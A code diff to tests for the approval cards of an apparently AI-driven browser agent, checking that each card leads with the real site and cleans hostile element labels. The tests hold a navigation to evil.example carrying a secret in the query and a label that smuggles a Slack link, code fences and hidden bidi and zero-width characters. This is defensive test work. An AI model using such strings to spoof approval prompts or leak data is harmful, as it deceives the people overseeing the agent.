@@ -34,8 +34,16 @@ test('an action is checked before anything reaches the browser', () => {
 
 test("the approval card names the site and the control as the page labels it, not as Kage describes it", () => {
   const card = actCard({ action: 'click', ref: 2 }, { url: 'https://mail.example.com/compose', el: { ref: 2, role: 'button', name: 'Send' } })
-  assert.match(card, /^Click button "Send" on mail\.example\.com/)
+  // The site comes first, so no label can push a fake site in front of the real one.
+  assert.match(card, /^mail\.example\.com: click button "Send"$/)
   const typed = actCard({ action: 'type', ref: 1, text: 'Lunch at 1?' }, { url: 'https://mail.example.com/', el: { ref: 1, role: 'textbox', name: 'Subject' } })
-  assert.match(typed, /Type "Lunch at 1\?" into textbox "Subject" on mail\.example\.com/)
-  assert.match(actCard({ action: 'navigate', url: 'https://evil.example/?q=secret' }, { url: 'https://mail.example.com/' }), /Go from mail\.example\.com to https:\/\/evil\.example\/\?q=secret/)
+  assert.match(typed, /^mail\.example\.com: type "Lunch at 1\?" into textbox "Subject"$/)
+  assert.match(actCard({ action: 'navigate', url: 'https://evil.example/?q=secret' }, { url: 'https://mail.example.com/' }), /^mail\.example\.com: go to https:\/\/evil\.example\/\?q=secret$/)
+  assert.match(actCard({ action: 'press', key: 'Enter' }, { url: 'https://mail.example.com/', el: { ref: 4, role: 'searchbox', name: 'Search' } }), /^mail\.example\.com: press Enter in searchbox "Search"$/)
+})
+
+test('a label cannot carry Slack links, code fences, or hidden characters onto the card', () => {
+  const card = actCard({ action: 'click', ref: 1 }, { url: 'https://mail.example.com/', el: { ref: 1, role: 'button', name: 'Send <https://evil.example|ok> ```x``` \u202Eevil\u200B' } })
+  assert.doesNotMatch(card, /[<>`\u202E\u200B]/)
+  assert.match(card, /^mail\.example\.com: click button "Send &lt;https:\/\/evil\.example\|ok&gt; '''x''' evil"$/)
 })
